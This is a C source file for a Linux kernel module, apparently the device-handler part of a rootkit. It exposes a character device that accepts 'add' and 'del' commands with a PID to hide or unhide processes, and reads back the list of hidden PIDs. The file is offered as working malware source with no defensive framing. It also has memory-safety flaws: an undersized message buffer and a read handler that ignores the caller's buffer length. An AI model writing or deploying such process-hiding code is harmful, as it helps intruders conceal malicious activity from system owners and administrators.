#include "device_handlers.h"

#include <linux/uaccess.h>
#include <linux/slab.h>

#include "consts.h"
#include "process_hide.h"

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

int device_open(struct inode *inode, struct file *file) {
    return SUCCESS;
}

int device_close(struct inode *inode, struct file *file) {
    return SUCCESS;
}

ssize_t device_read(struct file *filep, char *buffer, size_t len, loff_t *offset) {
    ProcessId* process_id;
    ProcessId* temp_process_id;
    char message[MAX_MESSAGE_SIZE];
    if (0 != *offset) {
        return 0;
    }
    list_for_each_entry_safe(process_id, temp_process_id, &hidden_processes, list_node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, process_id->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

ssize_t device_write(struct file * filep, const char * buffer, size_t len, loff_t * offset) {
    long pid;
    char* message;
    char add_message[] = "add";
    char del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1) {
        return -EAGAIN;
    }
    message = (char*)kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);
    if (0 == memcmp(message, add_message, sizeof(add_message) - 1)) {
        int retval = kstrtol(message + sizeof(add_message), 10, &pid);
        hide_process(pid);
    }
    else if (0 == memcmp(message, del_message, sizeof(del_message) - 1)) {
        int retval = kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(pid);
    }
    else { 
        kfree(message);
        return -EAGAIN;
    }
    *offset=len;
    kfree(message);
    return len;
}